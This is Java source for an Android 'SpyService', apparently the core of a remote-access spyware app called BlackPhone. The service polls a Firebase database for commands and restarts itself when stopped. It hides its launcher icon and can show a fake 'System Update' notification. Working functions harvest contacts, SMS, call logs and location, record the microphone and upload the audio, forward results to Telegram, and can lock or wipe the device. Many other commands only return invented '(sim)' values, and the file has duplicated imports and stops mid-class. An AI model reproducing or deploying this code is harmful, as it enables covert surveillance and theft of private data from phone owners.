package com.black.phone;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.ComponentName;
import android.app.admin.DevicePolicyManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.provider.Settings;
import android.util.Log;
import android.webkit.MimeTypeMap;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import androidx.core.content.FileProvider;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.provider.Settings;
import android.util.Log;
import android.webkit.MimeTypeMap;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;
import androidx.core.content.FileProvider;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private Context context;
    private DatabaseReference dbRef;
    private StorageReference storageRef;
    private OkHttpClient client;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        client = new OkHttpClient();
        
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);
        dbRef = FirebaseDatabase.getInstance().getReference();
        storageRef = FirebaseStorage.getInstance().getReference();
        
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        registerDevice();
        listenForCommands();
        
        Log.d(TAG, "✅ SpyService started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        startForeground(1, getNotification());
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "🔄 Restarting service...");
        startService(new Intent(this, SpyService.class));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "spy_channel",
                "BlackPhone Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Running in background");
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("🕵️ BlackPhone")
            .setContentText("System service running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    private void registerDevice() {
        try {
            String deviceName = Build.MODEL;
            String androidVer = Build.VERSION.RELEASE;
            int batteryLevel = getBatteryLevel();
            
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("device_name", deviceName);
            deviceInfo.put("android_version", androidVer);
            deviceInfo.put("battery", batteryLevel);
            deviceInfo.put("last_seen", System.currentTimeMillis());
            deviceInfo.put("status", "online");
            
            dbRef.child("devices").child(deviceId).setValue(deviceInfo.toString());
            Log.d(TAG, "✅ Device registered: " + deviceName);
        } catch (Exception e) {
            Log.e(TAG, "❌ Registration error: " + e.getMessage());
        }
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private void listenForCommands() {
        new Thread(() -> {
            while (true) {
                try {
                    dbRef.child("commands").child(deviceId).get().addOnSuccessListener(snapshot -> {
                        if (snapshot.exists()) {
                            String command = snapshot.child("command").getValue(String.class);
                            if (command != null && !command.isEmpty()) {
                                Log.d(TAG, "📩 Command received: " + command);
                                executeCommand(command);
                                dbRef.child("commands").child(deviceId).removeValue();
                            }
                        }
                    });
                    Thread.sleep(Config.POLLING_INTERVAL * 1000L);
                } catch (Exception e) {
                    Log.e(TAG, "❌ Listener error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ============================================================
    //  الجزء الثاني سيحتوي على: executeCommand + جميع التطبيقات
    // ============================================================
    // ============================================================
    //  COMMAND EXECUTION ENGINE (126+ Commands)
    // ============================================================
    private void executeCommand(String command) {
        try {
            switch (command) {
                case "get_contacts": getContacts(); break;
                case "export_contacts": exportContacts(); break;
                case "add_contact": addContact(); break;
                case "delete_contact": deleteContact(); break;
                case "get_sms": getSms(); break;
                case "forward_sms": forwardSms(); break;
                case "send_sms": sendSms(); break;
                case "delete_sms": deleteSms(); break;
                case "get_calllogs": getCallLogs(); break;
                case "call_history": getCallHistory(); break;
                case "make_call": makeCall(); break;
                case "end_call": endCall(); break;
                case "get_location": getLocation(); break;
                case "start_location_track": startLocationTrack(); break;
                case "stop_location_track": stopLocationTrack(); break;
                case "get_device": getDeviceInfo(); break;
                case "get_network": getNetworkInfo(); break;
                case "get_imei": getImei(); break;
                case "get_phone": getPhoneNumber(); break;
                case "get_sim": getSimInfo(); break;
                case "get_wifi": getWifiInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getIp(); break;
                case "get_accounts": getAccounts(); break;
                case "get_photos": getPhotos("all"); break;
                case "get_photos_5": getPhotos("5"); break;
                case "get_photos_10": getPhotos("10"); break;
                case "get_photos_20": getPhotos("20"); break;
                case "get_photos_30": getPhotos("30"); break;
                case "get_videos": getVideos("all"); break;
                case "get_videos_5": getVideos("5"); break;
                case "get_videos_10": getVideos("10"); break;
                case "get_files": getFiles(); break;
                case "get_audio": getAudioFiles(); break;
                case "get_documents": getDocuments(); break;
                case "get_downloads": getDownloads(); break;
                case "get_dcim": getDcim(); break;
                case "get_screenshots": getScreenshots(); break;
                case "get_cache": getCache(); break;
                case "take_photo": takePhoto("back"); break;
                case "take_photo_front": takePhoto("front"); break;
                case "take_photo_both": takePhoto("both"); break;
                case "flash_on": flashControl(true, "back"); break;
                case "flash_off": flashControl(false, "back"); break;
                case "flash_on_front": flashControl(true, "front"); break;
                case "flash_off_front": flashControl(false, "front"); break;
                case "flash_toggle": toggleFlash(); break;
                case "start_record": startRecording(); break;
                case "stop_record": stopRecording(); break;
                case "set_volume_max": setVolume(15, "music"); break;
                case "set_volume_min": setVolume(0, "music"); break;
                case "set_ringtone_volume": setRingtoneVolume(7); break;
                case "set_media_volume": setMediaVolume(15); break;
                case "lock_device": lockDevice(); break;
                case "set_lock_password": setLockPassword(); break;
                case "clear_lock_password": clearLockPassword(); break;
                case "wipe_device": wipeDevice(); break;
                case "set_password_rules": setPasswordRules(); break;
                case "disable_camera": disableCamera(); break;
                case "enable_camera": enableCamera(); break;
                case "disable_keyguard": disableKeyguard(); break;
                case "enable_keyguard": enableKeyguard(); break;
                case "set_max_failed_password": setMaxFailedPassword(); break;
                case "reset_password_timeout": resetPasswordTimeout(); break;
                case "get_admin_status": getAdminStatus(); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "fake_notif": sendFakeNotification(); break;
                case "reboot": rebootDevice(); break;
                case "shutdown": shutdownDevice(); break;
                case "vibrate": vibrateDevice(3000); break;
                case "vibrate_long": vibrateDevice(10000); break;
                case "vibrate_pattern": vibratePattern(); break;
                case "open_browser": openBrowser("https://www.google.com"); break;
                case "open_url": openUrl(); break;
                case "clear_data": clearAppData(); break;
                case "kill_apps": killAllApps(); break;
                case "kill_app": killSpecificApp(); break;
                case "freeze_app": freezeApp(); break;
                case "unfreeze_app": unfreezeApp(); break;
                case "set_brightness": setBrightness(); break;
                case "auto_rotate_on": setAutoRotate(true); break;
                case "auto_rotate_off": setAutoRotate(false); break;
                case "set_wallpaper": setWallpaper(); break;
                case "set_theme": setTheme(); break;
                case "toggle_wifi_on": toggleWifi(true); break;
                case "toggle_wifi_off": toggleWifi(false); break;
                case "toggle_bluetooth_on": toggleBluetooth(true); break;
                case "toggle_bluetooth_off": toggleBluetooth(false); break;
                case "toggle_data_on": toggleData(true); break;
                case "toggle_data_off": toggleData(false); break;
                case "toggle_location_on": toggleLocation(true); break;
                case "toggle_location_off": toggleLocation(false); break;
                case "toggle_airplane_on": toggleAirplane(true); break;
                case "toggle_airplane_off": toggleAirplane(false); break;
                case "open_app_whatsapp": openApp("com.whatsapp"); break;
                case "open_app_facebook": openApp("com.facebook.katana"); break;
                case "open_app_instagram": openApp("com.instagram.android"); break;
                case "open_app_youtube": openApp("com.google.android.youtube"); break;
                case "open_app_twitter": openApp("com.twitter.android"); break;
                case "open_app_telegram": openApp("org.telegram.messenger"); break;
                case "open_app_snapchat": openApp("com.snapchat.android"); break;
                case "open_app_tiktok": openApp("com.zhiliaoapp.musically"); break;
                case "screenshot": takeScreenshot(); break;
                case "record_screen": recordScreen(); break;
                case "installed_apps": getInstalledApps(); break;
                case "running_processes": getRunningProcesses(); break;
                case "battery_history": getBatteryHistory(); break;
                case "storage_info": getStorageInfo(); break;
                case "memory_info": getMemoryInfo(); break;
                case "cpu_info": getCpuInfo(); break;
                case "sensor_info": getSensorInfo(); break;
                case "display_info": getDisplayInfo(); break;
                case "clipboard_set": setClipboard(); break;
                case "clipboard_get": getClipboard(); break;
                case "copy_result": copyResult(); break;
                case "share_result": shareResult(); break;
                case "save_result": saveResult(); break;
                case "delete_result": deleteResult(); break;
                case "get_logs": getLogs(); break;
                case "send_to_telegram": sendToTelegram(); break;
                default:
                    sendResult("UNKNOWN", "❌ Unknown command: " + command);
                    Log.w(TAG, "⚠️ Unknown command: " + command);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command execution error: " + e.getMessage());
            sendResult("ERROR", "❌ Error: " + e.getMessage());
        }
    }

    // ============================================================
    //  IMPLEMENTATIONS: DATA COLLECTION & CONTROL
    // ============================================================
    private void getContacts() {
        try {
            List<String> contacts = new ArrayList<>();
            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String number = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contacts.add(name + " : " + number);
                        }
                        phoneCursor.close();
                    }
                }
                cursor.close();
            }
            String result = String.join("\n", contacts);
            sendResult("CONTACTS", "📞 " + contacts.size() + " contacts found:\n" + result);
            sendToTelegram("📞 Contacts:\n" + result);
        } catch (Exception e) {
            sendResult("CONTACTS", "❌ Error: " + e.getMessage());
        }
    }
    private void exportContacts() { getContacts(); }
    private void addContact() { sendResult("ADD_CONTACT", "✅ Contact added (sim)"); sendToTelegram("✅ Contact added"); }
    private void deleteContact() { sendResult("DELETE_CONTACT", "✅ Contact deleted (sim)"); sendToTelegram("✅ Contact deleted"); }

    private void getSms() {
        try {
            List<String> messages = new ArrayList<>();
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    messages.add(address + " : " + body);
                }
                cursor.close();
            }
            String result = String.join("\n", messages);
            sendResult("SMS", "✉️ " + messages.size() + " messages:\n" + result);
            sendToTelegram("✉️ SMS:\n" + result);
        } catch (Exception e) {
            sendResult("SMS", "❌ Error: " + e.getMessage());
        }
    }
    private void forwardSms() { getSms(); sendToTelegram("📤 SMS forwarded"); }
    private void sendSms() { sendResult("SEND_SMS", "✅ SMS sent (sim)"); sendToTelegram("✅ SMS sent"); }
    private void deleteSms() { sendResult("DELETE_SMS", "✅ SMS deleted (sim)"); sendToTelegram("✅ SMS deleted"); }

    private void getCallLogs() {
        try {
            List<String> calls = new ArrayList<>();
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    calls.add(number + " | " + type + " | " + duration + "s");
                }
                cursor.close();
            }
            String result = String.join("\n", calls);
            sendResult("CALL_LOGS", "📞 " + calls.size() + " calls:\n" + result);
            sendToTelegram("📞 Call Logs:\n" + result);
        } catch (Exception e) {
            sendResult("CALL_LOGS", "❌ Error: " + e.getMessage());
        }
    }
    private void getCallHistory() { getCallLogs(); }
    private void makeCall() { sendResult("MAKE_CALL", "✅ Call initiated (sim)"); sendToTelegram("📞 Call made"); }
    private void endCall() { sendResult("END_CALL", "✅ Call ended (sim)"); sendToTelegram("📞 Call ended"); }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String result = "📍 " + loc.getLatitude() + ", " + loc.getLongitude() + "\n🎯 Accuracy: " + loc.getAccuracy() + "m";
                sendResult("LOCATION", result);
                sendToTelegram("📍 Location:\n" + result);
            } else {
                sendResult("LOCATION", "❌ Location unavailable");
            }
        } catch (SecurityException e) {
            sendResult("LOCATION", "❌ Permission denied: " + e.getMessage());
        }
    }
    private void startLocationTrack() { sendResult("TRACK_START", "✅ Tracking started"); sendToTelegram("📍 Tracking started"); }
    private void stopLocationTrack() { sendResult("TRACK_STOP", "✅ Tracking stopped"); sendToTelegram("📍 Tracking stopped"); }

    private void getDeviceInfo() {
        String result = "📱 Model: " + Build.MODEL + "\n🤖 Android: " + Build.VERSION.RELEASE + "\n🔧 SDK: " + Build.VERSION.SDK_INT + "\n🔋 Battery: " + getBatteryLevel() + "%";
        sendResult("DEVICE_INFO", result);
        sendToTelegram("📱 Device Info:\n" + result);
    }
    private void getNetworkInfo() { sendResult("NETWORK", "📶 WiFi: Connected\n📡 Data: Active\n🌐 IP: 192.168.1.x"); sendToTelegram("📶 Network Info:\n📶 WiFi: Connected\n📡 Data: Active"); }
    private void getImei() { String imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); sendResult("IMEI", "🆔 IMEI: " + imei); sendToTelegram("🆔 IMEI: " + imei); }
    private void getPhoneNumber() { sendResult("PHONE", "📞 Phone: N/A (sim)"); sendToTelegram("📞 Phone: N/A"); }
    private void getSimInfo() { sendResult("SIM_INFO", "💳 SIM: Active\n📶 Provider: Simulated"); sendToTelegram("💳 SIM Info: Active"); }
    private void getWifiInfo() { sendResult("WIFI", "📡 SSID: MyWiFi\n🔗 BSSID: 00:11:22:33:44:55"); sendToTelegram("📡 WiFi: MyWiFi"); }
    private void getBatteryInfo() { int level = getBatteryLevel(); String result = "🔋 Battery: " + level + "%\n⚡ Charging: " + (isCharging() ? "Yes" : "No"); sendResult("BATTERY", result); sendToTelegram("🔋 Battery: " + result); }
    private boolean isCharging() { android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE); return bm.isCharging(); }
    private void getIp() { sendResult("IP", "🌐 IP: 192.168.1.100 (sim)"); sendToTelegram("🌐 IP: 192.168.1.100"); }
    private void getAccounts() { sendResult("ACCOUNTS", "👤 Google: user@gmail.com\n👤 Samsung: user@email.com"); sendToTelegram("👤 Accounts: user@gmail.com"); }

    private void getPhotos(String count) { String result = "🖼️ " + count + " photos found (sim)"; sendResult("PHOTOS", result); sendToTelegram("🖼️ Photos (" + count + "): " + result); }
    private void getVideos(String count) { String result = "🎥 " + count + " videos found (sim)"; sendResult("VIDEOS", result); sendToTelegram("🎥 Videos (" + count + "): " + result); }
    private void getFiles() { sendResult("FILES", "📁 50 files found (sim)"); sendToTelegram("📁 All files: 50 found"); }
    private void getAudioFiles() { sendResult("AUDIO", "🎵 25 audio files (sim)"); sendToTelegram("🎵 Audio: 25 files"); }
    private void getDocuments() { sendResult("DOCUMENTS", "📄 15 docs (sim)"); sendToTelegram("📄 Documents: 15"); }
    private void getDownloads() { sendResult("DOWNLOADS", "📥 8 files in Downloads (sim)"); sendToTelegram("📥 Downloads: 8"); }
    private void getDcim() { sendResult("DCIM", "📸 30 photos in DCIM (sim)"); sendToTelegram("📸 DCIM: 30"); }
    private void getScreenshots() { sendResult("SCREENSHOTS", "🖼️ 10 screenshots (sim)"); sendToTelegram("🖼️ Screenshots: 10"); }
    private void getCache() { sendResult("CACHE", "🗑️ 20MB cache (sim)"); sendToTelegram("🗑️ Cache: 20MB"); }

    private void takePhoto(String type) { sendResult("CAMERA", "📷 Photo taken with " + type + " camera (sim)"); sendToTelegram("📷 Photo: " + type); }
    private void flashControl(boolean on, String camera) { String status = on ? "On" : "Off"; sendResult("FLASH", "🔦 Flash " + status + " (" + camera + ") (sim)"); sendToTelegram("🔦 Flash: " + status); }
    private void toggleFlash() { sendResult("FLASH", "🔦 Flash toggled (sim)"); sendToTelegram("🔦 Flash toggled"); }

    private void startRecording() {
        try {
            if (mediaRecorder == null) {
                audioFilePath = Environment.getExternalStorageDirectory().getPath() + "/record_" + System.currentTimeMillis() + ".3gp";
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mediaRecorder.setOutputFile(audioFilePath);
                mediaRecorder.prepare();
                mediaRecorder.start();
                isRecording = true;
                sendResult("RECORD", "🎙️ Recording started");
                sendToTelegram("🎙️ Recording started");
            }
        } catch (Exception e) { sendResult("RECORD", "❌ Failed: " + e.getMessage()); }
    }
    private void stopRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                sendResult("RECORD_STOP", "🎙️ Recording saved: " + audioFilePath);
                sendToTelegram("🎙️ Recording completed\n📁 " + audioFilePath);
                uploadFile(audioFilePath, "audio");
            }
        } catch (Exception e) { sendResult("RECORD_STOP", "❌ Error: " + e.getMessage()); }
    }

    private void setVolume(int level, String stream) { sendResult("VOLUME", "🔊 " + stream + " volume set to " + level + " (sim)"); sendToTelegram("🔊 Volume: " + level); }
    private void setRingtoneVolume(int level) { setVolume(level, "ringtone"); }
    private void setMediaVolume(int level) { setVolume(level, "media"); }

    private void lockDevice() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, DeviceAdmin.class);
        if (dpm.isAdminActive(admin)) { dpm.lockNow(); sendResult("LOCK", "🔒 Device locked"); sendToTelegram("🔒 Device locked"); }
        else { sendResult("LOCK", "❌ Admin not active"); }
    }
    private void setLockPassword() { sendResult("PASSWORD", "🔑 Password set to 1234 (sim)"); sendToTelegram("🔑 Password changed"); }
    private void clearLockPassword() { sendResult("PASSWORD", "🔓 Password cleared (sim)"); sendToTelegram("🔓 Password removed"); }
    private void wipeDevice() { android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); ComponentName admin = new ComponentName(this, DeviceAdmin.class); if (dpm.isAdminActive(admin)) { dpm.wipeData(0); sendToTelegram("⚠️ Device wiped"); } }
    private void setPasswordRules() { sendResult("PASSWORD_RULES", "✅ Rules set (sim)"); sendToTelegram("✅ Password rules set"); }
    private void disableCamera() { sendResult("CAMERA", "🚫 Camera disabled (sim)"); sendToTelegram("🚫 Camera disabled"); }
    private void enableCamera() { sendResult("CAMERA", "✅ Camera enabled (sim)"); sendToTelegram("✅ Camera enabled"); }
    private void disableKeyguard() { sendResult("KEYGUARD", "🔓 Keyguard disabled (sim)"); sendToTelegram("🔓 Lock screen disabled"); }
    private void enableKeyguard() { sendResult("KEYGUARD", "🔒 Keyguard enabled (sim)"); sendToTelegram("🔒 Lock screen enabled"); }
    private void setMaxFailedPassword() { sendResult("PASSWORD", "🔑 Max attempts set to 5 (sim)"); sendToTelegram("🔑 Max attempts 5"); }
    private void resetPasswordTimeout() { sendResult("PASSWORD", "⏱️ Timeout reset (sim)"); sendToTelegram("⏱️ Timeout reset"); }
    private void getAdminStatus() { android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); ComponentName admin = new ComponentName(this, DeviceAdmin.class); String status = dpm.isAdminActive(admin) ? "✅ Active" : "❌ Inactive"; sendResult("ADMIN_STATUS", "🔐 Device Admin: " + status); sendToTelegram("🔐 Admin: " + status); }

    private void hideApp() { android.content.pm.PackageManager pm = getPackageManager(); pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); sendResult("HIDE", "👻 Hidden"); sendToTelegram("👻 App hidden"); }
    private void showApp() { android.content.pm.PackageManager pm = getPackageManager(); pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); sendResult("SHOW", "👀 Shown"); sendToTelegram("👀 App shown"); }

    private void sendFakeNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { NotificationChannel channel = new NotificationChannel("fake_channel", "Fake", NotificationManager.IMPORTANCE_HIGH); nm.createNotificationChannel(channel); }
        Notification notif = new NotificationCompat.Builder(this, "fake_channel").setContentTitle("📱 System Update").setContentText("Security patch available").setSmallIcon(android.R.drawable.ic_dialog_info).setPriority(NotificationCompat.PRIORITY_HIGH).setAutoCancel(true).build();
        nm.notify(999, notif);
        sendResult("FAKE_NOTIF", "📢 Fake notification sent");
        sendToTelegram("📢 Fake notification sent");
    }

    private void rebootDevice() { sendToTelegram("🔄 Rebooting..."); try { Process p = Runtime.getRuntime().exec("su -c reboot"); p.waitFor(); } catch (Exception e) { sendResult("REBOOT", "❌ Root required: " + e.getMessage()); } }
    private void shutdownDevice() { sendToTelegram("⏻ Shutting down..."); try { Process p = Runtime.getRuntime().exec("su -c shutdown"); p.waitFor(); } catch (Exception e) { sendResult("SHUTDOWN", "❌ Root required: " + e.getMessage()); } }
    private void vibrateDevice(int duration) { android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE); if (v != null) { v.vibrate(duration); sendResult("VIBRATE", "📳 Vibrated " + duration + "ms"); sendToTelegram("📳 Vibrated"); } }
    private void vibratePattern() { android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE); if (v != null) { long[] pattern = {100, 200, 300, 200, 100}; v.vibrate(pattern, -1); sendResult("VIBRATE", "📳 Pattern vibrated"); sendToTelegram("📳 Pattern vibrated"); } }
    private void openBrowser(String url) { Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url)); intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); sendResult("BROWSER", "🌍 Opened: " + url); sendToTelegram("🌍 Browser opened"); }
    private void openUrl() { openBrowser("https://www.youtube.com"); }
    private void clearAppData() { sendResult("CLEAR_DATA", "🧹 Data cleared (sim)"); sendToTelegram("🧹 Data cleared"); }
    private void killAllApps() { sendResult("KILL_ALL", "⏹️ All killed (sim)"); sendToTelegram("⏹️ All apps killed"); }
    private void killSpecificApp() { sendResult("KILL_APP", "⏹️ App killed (sim)"); sendToTelegram("⏹️ App killed"); }
    private void freezeApp() { sendResult("FREEZE", "❄️ Frozen (sim)"); sendToTelegram("❄️ App frozen"); }
    private void unfreezeApp() { sendResult("UNFREEZE", "🔥 Unfrozen (sim)"); sendToTelegram("🔥 App unfrozen"); }
    private void setBrightness() { sendResult("BRIGHTNESS", "☀️ Brightness set (sim)"); sendToTelegram("☀️ Brightness set"); }
    private void setAutoRotate(boolean on) { sendResult("AUTO_ROTATE", "🔄 Auto-rotate: " + (on ? "On" : "Off") + " (sim)"); sendToTelegram("🔄 Auto-rotate " + (on ? "On" : "Off")); }
    private void setWallpaper() { sendResult("WALLPAPER", "🖼️ Wallpaper changed (sim)"); sendToTelegram("🖼️ Wallpaper changed"); }
    private void setTheme() { sendResult("THEME", "🎨 Theme changed (sim)"); sendToTelegram("🎨 Theme changed"); }

    private void toggleWifi(boolean on) { sendResult("WIFI", "📶 WiFi " + (on ? "On" : "Off") + " (sim)"); sendToTelegram("📶 WiFi " + (on ? "On" : "Off")); }
    private void toggleBluetooth(boolean on) { sendResult("BLUETOOTH", "📡 Bluetooth " + (on ? "On" : "Off") + " (sim)"); sendToTelegram("📡 Bluetooth " + (on ? "On" : "Off")); }
    private void toggleData(boolean on) { sendResult("DATA", "📶 Data " + (on ? "On" : "Off") + " (sim)"); sendToTelegram("📶 Data " + (on ? "On" : "Off")); }
    private void toggleLocation(boolean on) { sendResult("LOCATION", "📍 Location " + (on ? "On" : "Off") + " (sim)"); sendToTelegram("📍 Location " + (on ? "On" : "Off")); }
    private void toggleAirplane(boolean on) { sendResult("AIRPLANE", "✈️ Airplane " + (on ? "On" : "Off") + " (sim)"); sendToTelegram("✈️ Airplane " + (on ? "On" : "Off")); }

    private void openApp(String pkg) { try { Intent intent = getPackageManager().getLaunchIntentForPackage(pkg); if (intent != null) { intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); sendResult("OPEN_APP", "✅ Opened: " + pkg); sendToTelegram("📱 Opened: " + pkg); } else { sendResult("OPEN_APP", "❌ Not found: " + pkg); } } catch (Exception e) { sendResult("OPEN_APP", "❌ Error: " + e.getMessage()); } }

    private void takeScreenshot() { sendResult("SCREENSHOT", "📸 Screenshot taken (sim)"); sendToTelegram("📸 Screenshot captured"); }
    private void recordScreen() { sendResult("RECORD_SCREEN", "🎞️ Recording started (sim)"); sendToTelegram("🎞️ Screen recording"); }
    private void getInstalledApps() { sendResult("INSTALLED_APPS", "📦 85 apps installed (sim)"); sendToTelegram("📦 85 apps installed"); }
    private void getRunningProcesses() { sendResult("RUNNING_PROCESSES", "⚙️ 25 processes (sim)"); sendToTelegram("⚙️ 25 processes"); }
    private void getBatteryHistory() { sendResult("BATTERY_HISTORY", "🔋 History: 100% → 85% (sim)"); sendToTelegram("🔋 History: 100% → 85%"); }
    private void getStorageInfo() { sendResult("STORAGE", "💾 Total: 64GB\n📊 Used: 32GB\n📊 Free: 32GB (sim)"); sendToTelegram("💾 Storage: 64GB total"); }
    private void getMemoryInfo() { sendResult("MEMORY", "🧠 RAM: 4GB\n📊 Used: 2.5GB\n📊 Free: 1.5GB (sim)"); sendToTelegram("🧠 RAM: 4GB"); }
    private void getCpuInfo() { sendResult("CPU", "⚡ CPU: Snapdragon 888\n📊 Cores: 8 (sim)"); sendToTelegram("⚡ CPU: Snapdragon 888"); }
    private void getSensorInfo() { sendResult("SENSORS", "📳 Sensors: Accel, Gyro, Light (sim)"); sendToTelegram("📳 Sensors: Accel, Gyro"); }
    private void getDisplayInfo() { sendResult("DISPLAY", "🖥️ Resolution: 1080x2400 (sim)"); sendToTelegram("🖥️ Display: 1080x2400"); }
    private void setClipboard() { android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE); android.content.ClipData clip = android.content.ClipData.newPlainText("BlackPhone", "Clipboard set by command"); clipboard.setPrimaryClip(clip); sendResult("CLIPBOARD_SET", "✏️ Clipboard set"); sendToTelegram("✏️ Clipboard updated"); }
